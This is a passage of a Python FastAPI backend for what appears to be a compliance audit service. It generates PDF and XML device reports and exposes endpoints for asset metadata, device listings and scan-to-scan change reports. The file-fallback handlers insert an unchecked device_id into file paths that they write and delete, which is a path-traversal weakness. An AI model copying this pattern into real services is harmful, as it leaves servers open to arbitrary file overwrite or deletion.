            [pdf_text("Anti-Virus",         styles["normal"]), pdf_text(av_val,   styles["normal"])],
            [pdf_text("Compression Utility", styles["normal"]), pdf_text(comp_val, styles["normal"])],
        ]
        summary_table = Table(summary_rows, colWidths=[360, 144])
        summary_table.setStyle(TableStyle(summary_style))
        elements.append(KeepTogether([summary_table, Spacer(1, 18)]))

        # ── OS Section ────────────────────────────────────────────────────────
        add_pair_table(elements, "Operating System", [
            ("OS Name",        data.os_name),
            ("OS Version",     data.os_version),
            ("OS Architecture", data.architecture),
            ("CS Name",        data.computer_name),
            ("License Status", data.license_status),
        ], styles)

        # ── Hotfixes ──────────────────────────────────────────────────────────
        hf_rows = [[
            pdf_text("#", styles["bold"]), pdf_text("Caption",     styles["bold"]),
            pdf_text("CS Name", styles["bold"]), pdf_text("Description", styles["bold"]),
            pdf_text("Fix ID", styles["bold"]), pdf_text("Installed On", styles["bold"]),
        ]]
        if data.hotfixes:
            for idx, hf in enumerate(data.hotfixes, 1):
                if isinstance(hf, HotfixData):
                    hf_rows.append([
                        pdf_text(idx, styles["normal"]), pdf_text(hf.caption, styles["normal"]),
                        pdf_text(hf.cs_name, styles["normal"]), pdf_text(hf.description, styles["normal"]),
                        pdf_text(hf.fix_id, styles["normal"]), pdf_text(hf.installed_on, styles["normal"]),
                    ])
                else:
                    hf_rows.append([
                        pdf_text(idx, styles["normal"]), pdf_text("", styles["normal"]),
                        pdf_text(data.computer_name, styles["normal"]), pdf_text("", styles["normal"]),
                        pdf_text(hf, styles["normal"]), pdf_text("", styles["normal"]),
                    ])
        else:
            hf_rows.append([pdf_text("-", styles["normal"])] + [pdf_text("-", styles["normal"])] * 5)
        elements.append(KeepTogether([
            Paragraph("OS Update Details", styles["section"]),
            apply_grid_style(Table(hf_rows, colWidths=[30, 160, 80, 94, 70, 70], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── MAC, Drive, Compression, AV ───────────────────────────────────────
        add_pair_table(elements, "Mac Address",               [("Mac Address", data.mac_address)], styles)
        add_pair_table(elements, "Drive Details",             [("Drive Name",  data.drive_name)],  styles)
        add_pair_table(elements, "Compression Utilities",     [("Installed",   compression_str)],  styles)
        add_pair_table(elements, "Antivirus",                 [("Installed AV", av_str)],          styles)

        # ── Printers ──────────────────────────────────────────────────────────
        pr_rows = [[
            pdf_text("#", styles["bold"]), pdf_text("Name",           styles["bold"]),
            pdf_text("SystemName", styles["bold"]), pdf_text("EnableBIDI", styles["bold"]),
            pdf_text("ExtendedStatus", styles["bold"]), pdf_text("PortName", styles["bold"]),
        ]]
        if data.printers:
            for idx, p in enumerate(data.printers, 1):
                if isinstance(p, PrinterData):
                    pr_rows.append([
                        pdf_text(idx, styles["normal"]), pdf_text(p.name, styles["normal"]),
                        pdf_text(p.system_name, styles["normal"]), pdf_text(p.enable_bidi, styles["normal"]),
                        pdf_text(p.extended_printer_status, styles["normal"]), pdf_text(p.port_name, styles["normal"]),
                    ])
                else:
                    pr_rows.append([
                        pdf_text(idx, styles["normal"]), pdf_text(p, styles["normal"]),
                        pdf_text(data.computer_name, styles["normal"]),
                        pdf_text("", styles["normal"]), pdf_text("", styles["normal"]), pdf_text("", styles["normal"]),
                    ])
        else:
            pr_rows.append([pdf_text("-", styles["normal"]), pdf_text("No printers detected", styles["normal"])] + [pdf_text("-", styles["normal"])] * 4)
        elements.append(KeepTogether([
            Paragraph("Printer Details", styles["section"]),
            apply_grid_style(Table(pr_rows, colWidths=[30, 180, 80, 64, 80, 70], repeatRows=1), header=True),
            pdf_text(f"Total Printers Connected: {len(data.printers)}", styles["bold"]),
            Spacer(1, 12)
        ]))

        # ── Hardware — Basic ──────────────────────────────────────────────────
        hw = data.hardware_details
        if isinstance(hw, HardwareDetails):
            add_pair_table(elements, "Hardware Details — Basic", [
                ("CPU",          hw.cpu),
                ("RAM",          hw.ram),
                ("Logical Disk", hw.disk),
            ], styles)
        elif isinstance(hw, dict) and hw:
            add_pair_table(elements, "Hardware Details — Basic", [
                ("CPU",          str(hw.get("cpu",  "Unknown"))),
                ("RAM",          str(hw.get("ram",  "Unknown"))),
                ("Logical Disk", str(hw.get("disk", "Unknown"))),
            ], styles)

        # ── Device Identity ───────────────────────────────────────────────────
        add_pair_table(elements, "Device Identity", [
            ("Serial Number", get_hw(data, "serial_number")),
            ("Manufacturer",  get_hw(data, "manufacturer")),
            ("Model",         get_hw(data, "model")),
        ], styles)

        # ── GPU Details ───────────────────────────────────────────────────────
        gpu_list = get_hw_list(data, "gpu_details")
        gpu_rows = [[pdf_text("GPU Name", styles["bold"]), pdf_text("Driver Version", styles["bold"]), pdf_text("VRAM", styles["bold"])]]
        if gpu_list:
            for g in gpu_list:
                if isinstance(g, GpuInfo):
                    gpu_rows.append([pdf_text(g.name, styles["normal"]), pdf_text(g.driver_version, styles["normal"]), pdf_text(g.vram, styles["normal"])])
                elif isinstance(g, dict):
                    gpu_rows.append([pdf_text(g.get("name",""), styles["normal"]), pdf_text(g.get("driver_version",""), styles["normal"]), pdf_text(g.get("vram",""), styles["normal"])])
        else:
            gpu_rows.append([pdf_text("No GPU data collected", styles["normal"]), pdf_text("-", styles["normal"]), pdf_text("-", styles["normal"])])
        elements.append(KeepTogether([
            Paragraph("GPU Details", styles["section"]),
            apply_grid_style(Table(gpu_rows, colWidths=[250, 130, 124], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── Physical Network Adapters ─────────────────────────────────────────
        na_list = get_hw_list(data, "network_adapters")
        na_rows = [[
            pdf_text("Adapter Name", styles["bold"]), pdf_text("Type", styles["bold"]),
            pdf_text("Speed", styles["bold"]), pdf_text("MAC Address", styles["bold"]),
        ]]
        if na_list:
            for a in na_list:
                d = a if isinstance(a, dict) else model_to_dict(a)
                na_rows.append([
                    pdf_text(d.get("name",""),         styles["normal"]),
                    pdf_text(d.get("adapter_type",""), styles["normal"]),
                    pdf_text(d.get("speed",""),        styles["normal"]),
                    pdf_text(d.get("mac_address",""),  styles["normal"]),
                ])
        else:
            na_rows.append([pdf_text("No adapter data", styles["normal"])] + [pdf_text("-", styles["normal"])] * 3)
        elements.append(KeepTogether([
            Paragraph("Physical Network Adapters", styles["section"]),
            apply_grid_style(Table(na_rows, colWidths=[200, 130, 100, 74], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── Disk Partitions ───────────────────────────────────────────────────
        dp_list = get_hw_list(data, "disk_partitions")
        dp_rows = [[
            pdf_text("Partition", styles["bold"]), pdf_text("Type", styles["bold"]),
            pdf_text("Size", styles["bold"]), pdf_text("Bootable", styles["bold"]),
        ]]
        if dp_list:
            for p in dp_list:
                d = p if isinstance(p, dict) else model_to_dict(p)
                dp_rows.append([
                    pdf_text(d.get("name",""),     styles["normal"]),
                    pdf_text(d.get("type",""),     styles["normal"]),
                    pdf_text(d.get("size_gb",""),  styles["normal"]),
                    pdf_text(d.get("bootable",""), styles["normal"]),
                ])
        else:
            dp_rows.append([pdf_text("No partition data", styles["normal"])] + [pdf_text("-", styles["normal"])] * 3)
        elements.append(KeepTogether([
            Paragraph("Disk Partitions", styles["section"]),
            apply_grid_style(Table(dp_rows, colWidths=[200, 120, 110, 74], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── Peripherals ───────────────────────────────────────────────────────
        peri_list = get_hw_list(data, "peripherals")
        peri_rows = [[pdf_text("Device Name", styles["bold"]), pdf_text("Type", styles["bold"]), pdf_text("Status", styles["bold"])]]
        if peri_list:
            for p in peri_list:
                d = p if isinstance(p, dict) else model_to_dict(p)
                peri_rows.append([
                    pdf_text(d.get("name",""),   styles["normal"]),
                    pdf_text(d.get("type",""),   styles["normal"]),
                    pdf_text(d.get("status",""), styles["normal"]),
                ])
        else:
            peri_rows.append([pdf_text("No peripheral data", styles["normal"]), pdf_text("-", styles["normal"]), pdf_text("-", styles["normal"])])
        elements.append(KeepTogether([
            Paragraph("Connected Peripherals", styles["section"]),
            apply_grid_style(Table(peri_rows, colWidths=[300, 120, 84], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── Network Details ───────────────────────────────────────────────────
        net_rows = [[pdf_text("IP Address", styles["bold"]), pdf_text("Gateway", styles["bold"]), pdf_text("MAC", styles["bold"])]]
        if data.network_details:
            for net in data.network_details:
                if isinstance(net, NetworkDetails):
                    net_rows.append([pdf_text(net.ip_address, styles["normal"]), pdf_text(net.gateway, styles["normal"]), pdf_text(net.mac, styles["normal"])])
                elif isinstance(net, dict):
                    net_rows.append([pdf_text(net.get("ip_address",""), styles["normal"]), pdf_text(net.get("gateway",""), styles["normal"]), pdf_text(net.get("mac",""), styles["normal"])])
        else:
            net_rows.append([pdf_text("-", styles["normal"]), pdf_text("No active adapters", styles["normal"]), pdf_text("-", styles["normal"])])
        elements.append(KeepTogether([
            Paragraph("Network Configuration", styles["section"]),
            apply_grid_style(Table(net_rows, colWidths=[168, 168, 168], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── User Accounts ─────────────────────────────────────────────────────
        usr_rows = [[pdf_text("Username", styles["bold"]), pdf_text("Disabled", styles["bold"])]]
        if data.user_accounts:
            for u in data.user_accounts:
                if isinstance(u, UserAccount):
                    usr_rows.append([pdf_text(u.name, styles["normal"]), pdf_text(u.disabled, styles["normal"])])
                elif isinstance(u, dict):
                    usr_rows.append([pdf_text(u.get("name",""), styles["normal"]), pdf_text(u.get("disabled",""), styles["normal"])])
        else:
            usr_rows.append([pdf_text("-", styles["normal"]), pdf_text("No local users found", styles["normal"])])
        elements.append(KeepTogether([
            Paragraph("Local User Accounts", styles["section"]),
            apply_grid_style(Table(usr_rows, colWidths=[252, 252], repeatRows=1), header=True),
            Spacer(1, 12)
        ]))

        # ── Software Inventory ────────────────────────────────────────────────
        sw_rows = [[
            pdf_text("#", styles["bold"]), pdf_text("Application Name", styles["bold"]),
            pdf_text("Version", styles["bold"]), pdf_text("Publisher", styles["bold"]),
            pdf_text("Install Date", styles["bold"]), pdf_text("Size", styles["bold"]),
        ]]
        if data.software_inventory:
            for idx, sw in enumerate(data.software_inventory, 1):
                d = sw if isinstance(sw, dict) else model_to_dict(sw)
                sw_rows.append([
                    pdf_text(idx,                    styles["small"]),
                    pdf_text(d.get("name",""),       styles["small"]),
                    pdf_text(d.get("version",""),    styles["small"]),
                    pdf_text(d.get("publisher",""),  styles["small"]),
                    pdf_text(d.get("install_date",""), styles["small"]),
                    pdf_text(d.get("size_mb",""),    styles["small"]),
                ])
        else:
            sw_rows.append([pdf_text("-", styles["normal"]), pdf_text("No software data collected", styles["normal"])] + [pdf_text("-", styles["normal"])] * 4)
        elements.append(Paragraph("Installed Software Inventory", styles["section"]))
        elements.append(pdf_text(f"Total Applications: {len(data.software_inventory)}", styles["bold"]))
        elements.append(Spacer(1, 6))
        elements.append(apply_grid_style(Table(sw_rows, colWidths=[28, 180, 70, 110, 68, 48], repeatRows=1), header=True))
        elements.append(Spacer(1, 12))

        doc.build(elements, onFirstPage=draw_page_decorations, onLaterPages=draw_page_decorations)
        logger.info(f"PDF built: {pdf_path}")

    except Exception as e:
        logger.error(f"PDF generation failed: {e}")

    # ── XML Generation ────────────────────────────────────────────────────────
    try:
        root = ET.Element("NsdlComplianceAudit", version="3.0.0")

        meta = ET.SubElement(root, "UserDetails")
        ET.SubElement(meta, "BranchName").text     = branch_name
        ET.SubElement(meta, "BranchCode").text     = branch_code
        ET.SubElement(meta, "OfficerName").text    = officer_name
        ET.SubElement(meta, "ExecutionDateTime").text = audit_time
        ET.SubElement(meta, "Consent").text        = data.consent

        os_xml = ET.SubElement(root, "OperatingSystem")
        ET.SubElement(os_xml, "OSName").text        = data.os_name
        ET.SubElement(os_xml, "OSVersion").text     = data.os_version
        ET.SubElement(os_xml, "OSArchitecture").text = data.architecture
        ET.SubElement(os_xml, "CSName").text        = data.computer_name
        ET.SubElement(os_xml, "LicenseStatus").text = data.license_status

        updates_xml = ET.SubElement(root, "OSUpdateDetails")
        for hf in data.hotfixes:
            item = ET.SubElement(updates_xml, "Hotfix")
            if isinstance(hf, HotfixData):
                ET.SubElement(item, "Caption").text     = hf.caption
                ET.SubElement(item, "CSName").text      = hf.cs_name
                ET.SubElement(item, "Description").text = hf.description
                ET.SubElement(item, "FixID").text       = hf.fix_id
                ET.SubElement(item, "InstalledOn").text = hf.installed_on
            else:
                ET.SubElement(item, "FixID").text = clean_string(hf, "")

        ET.SubElement(root, "MacAddress").text          = data.mac_address
        ET.SubElement(root, "DriveName").text           = data.drive_name
        ET.SubElement(root, "CompressionUtilities").text = compression_str
        ET.SubElement(root, "Antivirus").text           = av_str

        printers_xml = ET.SubElement(root, "PrinterDetails")
        for p in data.printers:
            item = ET.SubElement(printers_xml, "Printer")
            if isinstance(p, PrinterData):
                ET.SubElement(item, "Name").text                  = p.name
                ET.SubElement(item, "SystemName").text            = p.system_name
                ET.SubElement(item, "EnableBIDI").text            = p.enable_bidi
                ET.SubElement(item, "ExtendedPrinterStatus").text = p.extended_printer_status
                ET.SubElement(item, "PortName").text              = p.port_name
            else:
                ET.SubElement(item, "Name").text = clean_string(p, "")
        ET.SubElement(printers_xml, "TotalPrinterConnected").text = str(len(data.printers))

        hw_xml = ET.SubElement(root, "HardwareDetails")
        ET.SubElement(hw_xml, "CPU").text          = get_hw(data, "cpu")
        ET.SubElement(hw_xml, "RAM").text          = get_hw(data, "ram")
        ET.SubElement(hw_xml, "Disk").text         = get_hw(data, "disk")
        ET.SubElement(hw_xml, "SerialNumber").text = get_hw(data, "serial_number")
        ET.SubElement(hw_xml, "Manufacturer").text = get_hw(data, "manufacturer")
        ET.SubElement(hw_xml, "Model").text        = get_hw(data, "model")

        gpus_xml = ET.SubElement(hw_xml, "GPUList")
        for g in get_hw_list(data, "gpu_details"):
            d = g if isinstance(g, dict) else model_to_dict(g)
            gi = ET.SubElement(gpus_xml, "GPU")
            ET.SubElement(gi, "Name").text          = d.get("name", "")
            ET.SubElement(gi, "DriverVersion").text = d.get("driver_version", "")
            ET.SubElement(gi, "VRAM").text          = d.get("vram", "")

        nas_xml = ET.SubElement(hw_xml, "NetworkAdapters")
        for a in get_hw_list(data, "network_adapters"):
            d = a if isinstance(a, dict) else model_to_dict(a)
            ai = ET.SubElement(nas_xml, "Adapter")
            ET.SubElement(ai, "Name").text        = d.get("name", "")
            ET.SubElement(ai, "Type").text        = d.get("adapter_type", "")
            ET.SubElement(ai, "Speed").text       = d.get("speed", "")
            ET.SubElement(ai, "MACAddress").text  = d.get("mac_address", "")

        dps_xml = ET.SubElement(hw_xml, "DiskPartitions")
        for p in get_hw_list(data, "disk_partitions"):
            d = p if isinstance(p, dict) else model_to_dict(p)
            pi = ET.SubElement(dps_xml, "Partition")
            ET.SubElement(pi, "Name").text     = d.get("name", "")
            ET.SubElement(pi, "Type").text     = d.get("type", "")
            ET.SubElement(pi, "SizeGB").text   = d.get("size_gb", "")
            ET.SubElement(pi, "Bootable").text = d.get("bootable", "")

        peri_xml = ET.SubElement(hw_xml, "Peripherals")
        for p in get_hw_list(data, "peripherals"):
            d = p if isinstance(p, dict) else model_to_dict(p)
            pe = ET.SubElement(peri_xml, "Device")
            ET.SubElement(pe, "Name").text   = d.get("name", "")
            ET.SubElement(pe, "Type").text   = d.get("type", "")
            ET.SubElement(pe, "Status").text = d.get("status", "")

        sw_xml = ET.SubElement(root, "SoftwareInventory")
        ET.SubElement(sw_xml, "TotalInstalled").text = str(len(data.software_inventory))
        for sw in data.software_inventory:
            d = sw if isinstance(sw, dict) else model_to_dict(sw)
            si = ET.SubElement(sw_xml, "Application")
            ET.SubElement(si, "Name").text        = d.get("name", "")
            ET.SubElement(si, "Version").text     = d.get("version", "")
            ET.SubElement(si, "Publisher").text   = d.get("publisher", "")
            ET.SubElement(si, "InstallDate").text = d.get("install_date", "")
            ET.SubElement(si, "SizeMB").text      = d.get("size_mb", "")

        tree = ET.ElementTree(root)
        tree.write(xml_path, encoding="utf-8", xml_declaration=True)
        logger.info(f"XML built: {xml_path}")

    except Exception as e:
        logger.error(f"XML generation failed: {e}")

    if not os.path.exists(pdf_path) or not os.path.exists(xml_path):
        _session_set(cid, {
            "status": "failed", "branch_name": branch_name, "branch_code": branch_code,
            "officer_name": officer_name, "error": "Report generation failed.",
            "pdf_path": pdf_path if os.path.exists(pdf_path) else None,
            "xml_path": xml_path if os.path.exists(xml_path) else None,
        })
        raise HTTPException(status_code=500, detail="Audit report generation failed.")

    _session_set(cid, {
        "status": "completed", "branch_name": branch_name, "branch_code": branch_code,
        "officer_name": officer_name, "pdf_path": pdf_path, "xml_path": xml_path,
    })
    # Persist audit data to PostgreSQL
    _db_save_audit(
        cid, data.computer_name, raw_json,
        json_path, pdf_path, xml_path, audit_time
    )
    return {"status": "success", "pdf_report": pdf_path, "xml_report": xml_path}


# ==============================================================================
# 6. REPORT SERVING
# ==============================================================================
@app.get("/download-report")
def download_report(client_id: str = Query(...), format: str = Query("pdf"), action: str = Query("download")):
    session = _session_get(client_id)
    if not session or session.get("status") != "completed":
        raise HTTPException(status_code=404, detail="Audit report not ready or not found.")
    disposition = "inline" if action == "view" else "attachment"
    if format.lower() == "pdf":
        fp = session.get("pdf_path")
        if not fp or not os.path.exists(fp):
            raise HTTPException(status_code=404, detail="PDF not found.")
        return FileResponse(fp, media_type="application/pdf", filename=os.path.basename(fp), content_disposition_type=disposition)
    if format.lower() == "xml":
        fp = session.get("xml_path")
        if not fp or not os.path.exists(fp):
            raise HTTPException(status_code=404, detail="XML not found.")
        return FileResponse(fp, media_type="application/xml", filename=os.path.basename(fp), content_disposition_type=disposition)
    raise HTTPException(status_code=400, detail="Invalid format. Use 'pdf' or 'xml'.")


# ==============================================================================
# 7. ASSET METADATA — PHASE 3  (PostgreSQL-backed, file fallback)
# ==============================================================================
@app.post("/asset-metadata")
def save_asset_metadata(metadata: AssetMetadata):
    metadata.last_updated = datetime.now().isoformat()
    data_dict = model_to_dict(metadata)
    if _db_ok():
        try:
            with _db_ctx() as conn:
                with conn.cursor() as cur:
                    cur.execute("""
                        INSERT INTO asset_metadata (device_id, data)
                        VALUES (%s, %s)
                        ON CONFLICT (device_id) DO UPDATE
                            SET data = EXCLUDED.data, updated_at = NOW()
                    """, (metadata.device_id, PgJson(data_dict)))
            logger.info(f"Asset saved to DB: {metadata.device_id}")
            return {"status": "saved", "device_id": metadata.device_id}
        except Exception as e:
            logger.error(f"DB asset save: {e}")
    # file fallback
    path = f"{ASSET_METADATA_DIR}/{metadata.device_id}.json"
    try:
        with open(path, "w") as f:
            json.dump(data_dict, f, indent=4)
        return {"status": "saved", "device_id": metadata.device_id}
    except Exception as e:
        raise HTTPException(status_code=500, detail="Failed to save metadata.")


@app.get("/asset-metadata/{device_id}")
def get_asset_metadata(device_id: str):
    if _db_ok():
        try:
            with _db_ctx() as conn:
                with conn.cursor(cursor_factory=RealDictCursor) as cur:
                    cur.execute("SELECT data FROM asset_metadata WHERE device_id = %s", (device_id,))
                    row = cur.fetchone()
                    if row:
                        return row["data"]
        except Exception as e:
            logger.error(f"DB asset get: {e}")
    # file fallback
    path = f"{ASSET_METADATA_DIR}/{device_id}.json"
    if not os.path.exists(path):
        raise HTTPException(status_code=404, detail="Asset not found.")
    with open(path) as f:
        return json.load(f)


@app.put("/asset-metadata/{device_id}")
def update_asset_metadata(device_id: str, metadata: AssetMetadata):
    metadata.device_id    = device_id
    metadata.last_updated = datetime.now().isoformat()
    data_dict = model_to_dict(metadata)
    if _db_ok():
        try:
            with _db_ctx() as conn:
                with conn.cursor() as cur:
                    cur.execute("""
                        INSERT INTO asset_metadata (device_id, data)
                        VALUES (%s, %s)
                        ON CONFLICT (device_id) DO UPDATE
                            SET data = EXCLUDED.data, updated_at = NOW()
                    """, (device_id, PgJson(data_dict)))
            return {"status": "updated", "device_id": device_id}
        except Exception as e:
            logger.error(f"DB asset update: {e}")
    # file fallback
    path = f"{ASSET_METADATA_DIR}/{device_id}.json"
    with open(path, "w") as f:
        json.dump(data_dict, f, indent=4)
    return {"status": "updated", "device_id": device_id}


@app.delete("/asset-metadata/{device_id}")
def delete_asset_metadata(device_id: str):
    if _db_ok():
        try:
            with _db_ctx() as conn:
                with conn.cursor() as cur:
                    cur.execute("DELETE FROM asset_metadata WHERE device_id = %s RETURNING device_id", (device_id,))
                    if cur.fetchone():
                        return {"status": "deleted", "device_id": device_id}
        except Exception as e:
            logger.error(f"DB asset delete: {e}")
    # file fallback
    path = f"{ASSET_METADATA_DIR}/{device_id}.json"
    if not os.path.exists(path):
        raise HTTPException(status_code=404, detail="Asset not found.")
    os.remove(path)
    return {"status": "deleted", "device_id": device_id}


@app.get("/assets")
def list_assets():
    if _db_ok():
        try:
            with _db_ctx() as conn:
                with conn.cursor(cursor_factory=RealDictCursor) as cur:
                    cur.execute("SELECT data FROM asset_metadata ORDER BY updated_at DESC")
                    assets = [row["data"] for row in cur.fetchall()]
            return {"assets": assets, "total": len(assets)}
        except Exception as e:
            logger.error(f"DB list assets: {e}")
    # file fallback
    assets = []
    if os.path.exists(ASSET_METADATA_DIR):
        for fn in os.listdir(ASSET_METADATA_DIR):
            if fn.endswith(".json"):
                try:
                    with open(f"{ASSET_METADATA_DIR}/{fn}") as f:
                        assets.append(json.load(f))
                except Exception:
                    pass
    assets.sort(key=lambda x: x.get("last_updated", ""), reverse=True)
    return {"assets": assets, "total": len(assets)}


# ==============================================================================
# 8. AUDIT DEVICE & SOFTWARE QUERIES  (PostgreSQL-backed, file fallback)
# ==============================================================================
@app.get("/api/devices")
def list_audited_devices():
    if _db_ok():
        try:
            with _db_ctx() as conn:
                with conn.cursor(cursor_factory=RealDictCursor) as cur:
                    cur.execute("""
                        SELECT DISTINCT ON (computer_name)
                            computer_name,
                            executed_at                        AS last_seen,
                            audit_json->>'os_name'             AS os_name,
                            audit_json->'hardware_details'->>'public_ip' AS ip,
                            audit_json->>'username'            AS username,
                            json_path                          AS file
                        FROM audit_results
                        ORDER BY computer_name, created_at DESC
                    """)
                    devices = [dict(r) for r in cur.fetchall()]
            return {"devices": devices, "total": len(devices)}
        except Exception as e:
            logger.error(f"DB list devices: {e}")
    # file fallback
    devices = {}
    if os.path.exists(USER_INFO_DIR):
        for fn in os.listdir(USER_INFO_DIR):
            if fn.endswith(".json") and fn.startswith("audit_"):
                try:
                    with open(f"{USER_INFO_DIR}/{fn}") as f:
                        d = json.load(f)
                    name = d.get("computer_name", "Unknown")
                    ts   = d.get("execution_datetime", "")
                    if name not in devices or ts > devices[name]["last_seen"]:
                        hw = d.get("hardware_details", {})
                        # Extract IP from network details or network adapters
                        ip = ""
                        for net in d.get("network_details", []):
                            raw_ip = net.get("ip_address", "")
                            for ip_part in raw_ip.split(","):
                                ic = ip_part.strip()
                                if ic and ic not in ("", "Unknown", "0.0.0.0"):
                                    ip = ic
                                    break
                            if ip:
                                break
                        if not ip:
                            for a in hw.get("network_adapters", []):
                                aip = a.get("ipv4_address", "") or a.get("ip_address", "")
                                if aip and aip not in ("", "Unknown", "0.0.0.0"):
                                    ip = aip
                                    break
                        # Extract username from user_accounts
                        username = ""
                        for u in d.get("user_accounts", []):
                            n = (u.get("name") or "").strip()
                            if n and n.lower() not in ("", "unknown") and u.get("disabled", "False") != "True":
                                username = n
                                break
                        devices[name] = {
                            "computer_name": name,
                            "last_seen": ts,
                            "os_name":   d.get("os_name", ""),
                            "ip":        ip,
                            "username":  username,
                            "file":      fn,
                        }
                except Exception:
                    pass
    return {"devices": list(devices.values()), "total": len(devices)}


@app.get("/api/software/{computer_name}")
def get_software_for_device(computer_name: str):
    # Collect all audits for this device, newest-first (max 2 for diff)
    audits = []
    if _db_ok():
        try:
            with _db_ctx() as conn:
                with conn.cursor(cursor_factory=RealDictCursor) as cur:
                    cur.execute("""
                        SELECT audit_json, executed_at
                        FROM audit_results
                        WHERE LOWER(computer_name) = LOWER(%s)
                        ORDER BY created_at DESC
                        LIMIT 2
                    """, (computer_name,))
                    for row in cur.fetchall():
                        audits.append((row["executed_at"] or "", row["audit_json"] or {}))
        except Exception as e:
            logger.error(f"DB software query: {e}")
    # file fallback
    if not audits and os.path.exists(USER_INFO_DIR):
        for fn in os.listdir(USER_INFO_DIR):
            if fn.endswith(".json") and fn.startswith("audit_"):
                try:
                    with open(os.path.join(USER_INFO_DIR, fn)) as f:
                        d = json.load(f)
                    if d.get("computer_name", "").lower() == computer_name.lower():
                        audits.append((d.get("execution_datetime", ""), d))
                except Exception:
                    pass
    if not audits:
        raise HTTPException(status_code=404, detail=f"No audit found for device: {computer_name}")

    audits.sort(key=lambda x: x[0], reverse=True)
    latest_ts, latest_data = audits[0]
    prev_ts, prev_data = audits[1] if len(audits) > 1 else ("", None)

    # ── Incremental diff: tag each app with change_status ──────────────────────
    def _sw_key(app):
        """Normalised lookup key: lowercase app name."""
        return (app.get("name") or "").strip().lower()

    latest_sw = latest_data.get("software_inventory", [])

    if prev_data:
        prev_map = {_sw_key(a): a for a in prev_data.get("software_inventory", [])}
        tagged = []
        latest_keys = set()
        for app in latest_sw:
            key = _sw_key(app)
            latest_keys.add(key)
            if key not in prev_map:
                tagged.append({**app, "change_status": "new", "prev_version": ""})
            elif (app.get("version") or "").strip() != (prev_map[key].get("version") or "").strip():
                tagged.append({**app, "change_status": "updated",
                                "prev_version": prev_map[key].get("version", "")})
            else:
                tagged.append({**app, "change_status": "unchanged", "prev_version": ""})
        # Apps present in previous audit but gone from latest → "removed"
        for prev_app in prev_data.get("software_inventory", []):
            if _sw_key(prev_app) not in latest_keys:
                tagged.append({**prev_app, "change_status": "removed", "prev_version": ""})
    else:
        # Only one audit — sort by install_date newest-first, no diff
        tagged = [{**app, "change_status": "unchanged", "prev_version": ""} for app in latest_sw]

    return {
        "computer_name":      computer_name,
        "last_audit":         latest_ts,
        "previous_audit":     prev_ts,
        "software_inventory": tagged,
        "total":              len(latest_sw),
        "os_name":            latest_data.get("os_name", ""),
        "os_version":         latest_data.get("os_version", ""),
        "architecture":       latest_data.get("architecture", ""),
        "license_status":     latest_data.get("license_status", ""),
        "hardware_details":   latest_data.get("hardware_details", {}),
        "network_details":    latest_data.get("network_details", []),
        "user_accounts":      latest_data.get("user_accounts", []),
        "login_history":      latest_data.get("login_history", []),
        "hotfixes":           latest_data.get("hotfixes", []),
        "antivirus":          latest_data.get("antivirus", ""),
        "printers":           latest_data.get("printers", [])
    }


# ==============================================================================
# 8b. DEVICE DIFF — Change Report Card
# ==============================================================================
@app.get("/api/device-diff/{computer_name}")
def get_device_diff(computer_name: str):
    """Compare the two most recent audits for a device and return a change report."""
    audits = []
    if _db_ok():
        try:
            with _db_ctx() as conn:
                with conn.cursor(cursor_factory=RealDictCursor) as cur:
                    cur.execute("""
                        SELECT audit_json, executed_at
                        FROM audit_results
                        WHERE LOWER(computer_name) = LOWER(%s)
                        ORDER BY created_at DESC
                        LIMIT 2
                    """, (computer_name,))
                    for row in cur.fetchall():
                        audits.append((row["executed_at"] or "", row["audit_json"] or {}))
        except Exception as e:
            logger.error(f"DB device-diff query: {e}")

    # file fallback
    if not audits and os.path.exists(USER_INFO_DIR):
        for fn in os.listdir(USER_INFO_DIR):
            if fn.endswith(".json") and fn.startswith("audit_"):
                try:
                    with open(os.path.join(USER_INFO_DIR, fn)) as f:
                        d = json.load(f)
                    if d.get("computer_name", "").lower() == computer_name.lower():
                        audits.append((d.get("execution_datetime", ""), d))
                except Exception:
                    pass

    if not audits:
        return {"has_diff": False, "scan_count": 0, "message": "No audits found for this device."}

    audits.sort(key=lambda x: x[0], reverse=True)
    scan_count = len(audits)

    if scan_count < 2:
        return {"has_diff": False, "scan_count": 1, "message": "Only 1 scan available — need at least 2 for a change report."}

    curr_ts, curr = audits[0]
    prev_ts, prev = audits[1]

    # ── Hardware changes ──
    hw_changes = []
    HW_FIELDS = [
        ("os_name", "OS Name"), ("os_version", "OS Version"), ("architecture", "Architecture"),
        ("license_status", "License Status"), ("antivirus", "Antivirus"),
    ]
    for key, label in HW_FIELDS:
        old_val = str(prev.get(key, "") or "")
        new_val = str(curr.get(key, "") or "")
        if old_val != new_val:
            hw_changes.append({"field": label, "previous": old_val or "—", "current": new_val or "—"})

    HW_DETAIL_FIELDS = [
        ("total_ram", "Total RAM"), ("processor_type", "Processor"), ("manufacturer", "Manufacturer"),
        ("model", "Model"), ("serial_number", "Serial Number"), ("bios_version", "BIOS Version"),
        ("domain", "Domain"), ("domain_role", "Domain Role"),
    ]
    curr_hw = curr.get("hardware_details", {})
    prev_hw = prev.get("hardware_details", {})
    for key, label in HW_DETAIL_FIELDS:
        old_val = str(prev_hw.get(key, "") or "")
        new_val = str(curr_hw.get(key, "") or "")
        if old_val != new_val:
            hw_changes.append({"field": label, "previous": old_val or "—", "current": new_val or "—"})

    # ── Software changes ──
    def _sw_key(app):
        return (app.get("name") or "").strip().lower()

    curr_sw = {_sw_key(a): a for a in curr.get("software_inventory", [])}
    prev_sw = {_sw_key(a): a for a in prev.get("software_inventory", [])}

    newly_installed = []
    for key, app in curr_sw.items():
        if key and key not in prev_sw:
            newly_installed.append({"name": app.get("name", ""), "version": app.get("version", ""), "publisher": app.get("publisher", "")})

    newly_removed = []
    for key, app in prev_sw.items():
        if key and key not in curr_sw:
            newly_removed.append({"name": app.get("name", ""), "version": app.get("version", ""), "publisher": app.get("publisher", "")})

    return {
        "has_diff": True,
        "scan_count": scan_count,
        "previous_scan": prev_ts,
        "current_scan": curr_ts,
        "summary": {
            "installed_count": len(newly_installed),
            "removed_count": len(newly_removed),
            "hw_change_count": len(hw_changes),
        },
        "hw_changes": hw_changes,
        "newly_installed": newly_installed,
        "newly_removed": newly_removed,
    }


# ==============================================================================
# 9. NETWORK DISCOVERY — PHASE 4
# ==============================================================================
